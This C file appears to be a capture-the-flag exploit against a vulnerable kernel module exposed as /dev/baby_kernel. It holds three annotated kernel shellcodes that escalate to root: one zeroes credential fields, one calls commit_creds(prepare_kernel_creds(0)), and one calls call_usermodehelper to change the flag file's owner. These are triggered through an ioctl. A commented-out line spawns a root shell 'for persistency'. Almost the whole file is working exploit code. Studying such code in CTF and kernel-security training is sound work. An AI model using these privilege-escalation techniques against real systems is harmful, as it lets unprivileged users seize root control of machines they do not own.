# include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>


#define BABY_KERNEL_IOCTL 0xffffffffc00000c0

// first way: 
void shellcode_1() {
    asm volatile(
        "mov rdi, gs:0x1AD00\n"          // it will move the 'current' pointer inside rdi
        "mov rsi, [rdi + 0x740]\n"       // it will move the pointer to real_cred into rsi
        "mov QWORD PTR[rsi+0x8], 0\n"    // it will move 0 into rsi+0x8, which is real_cred + 8
        "mov QWORD PTR[rsi+0x10], 0\n" 
        "mov QWORD PTR[rsi+0x18], 0\n" 
        "mov QWORD PTR[rsi+0x20], 0\n" 
    );
}

// second way: call prepare kernel creds and commit_creds one after the other, so we want to execute commit_creds(prepare_kernel_creds(0))
#define PREPARE_KERNEL_CREDS 0xffffffff81094670
#define COMMIT_CREDS 0xffffffff810943d0

void shellcode_2(){
    unsigned long long *root_creds;

    asm volatile(
        "mov rax, %0\n"   
        "mov rdi, 0\n"   //first argument (and only for prepare_kernel_creds) of a function in x86 goes into rdi
        "call rax\n"
        : "=a"(root_creds)          // outputs: where to save the output (which is in rax -> =a) of the shellcode
        : "r"(PREPARE_KERNEL_CREDS) // inputs: what do we fill the %0, %1 ecc. with?
        : "rdi"                     // clobbered registers: which register the compilers should not use since we are using them
    );

    asm volatile(
        "mov rax, %0\n"
        "mov rdi, %1\n"
        "call rax\n"
        :
        :"r"(COMMIT_CREDS), "r"(root_creds)
        :"rdi", "rax"
    );
}

// same as second way, but in a simpler and less fancy way
void shellcode_2_bis(){
    asm volatile(
        "mov rax, 0xffffffff81094670\n"
        "mov rdi, 0\n"
        "call rax\n"
        "mov rdi, rax\n"
        "mov rax, 0xffffffff810943d0\n"
        "call rax\n"
    );
}


// third way: we are calling call_usermodehelper
#define CALL_USERMODEHELPER 0xffffffff81086630

//these are the parameters of call_usermodehelper
const char * argv[] = {"/bin/chown\0", "1000:1000\0", "/flag\0", NULL}; 

void shellcode_3(){
    asm volatile(
        "mov rdi, %0\n" // what to execute
        "mov rsi, %1\n" // argv, list of parameters
        "mov rdx, 0\n"  // environment variable, just 0
        "mov r10, 2\n"  // wait parameter (last one)
        "mov rax, %2\n" 
        "call rax\n"    // call CALL_USERMODEHELPER
        :
        :"r"(argv[0]), "r"(argv), "r"(CALL_USERMODEHELPER)
        :"rdi", "rsi", "rdx", "r10", "rax"
    );

}

int main(){
    int fd;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    fd = open("/dev/baby_kernel", O_RDWR);

    if(fd<0){
        perror("open error");
        return 1;
    }

    printf("file opened: fd = %d\n", fd);

    //
    ioctl(fd, 1337, shellcode_2);

    // At this point, after executing:
    // 1. shellcode_1 / shellcode_2, shellcode_2_bis ->  we are root, so we can read the flag
    // 2. shellcode_3 -> the new owner of the file flag is not root but the user 'user', so we can read it as 'user' indeed because only its owner can read it
    close(fd);

    fd = open("/flag", O_RDONLY);

    if(fd<0){
        perror("open error");
        return 1;
    }

    char buf[0x100];
    read(fd, buf, sizeof(buf));

    printf("flag: %s\n", buf);
    // system("/bin/sh");     <- we open a shell with root privileges, so we gain persistency

}
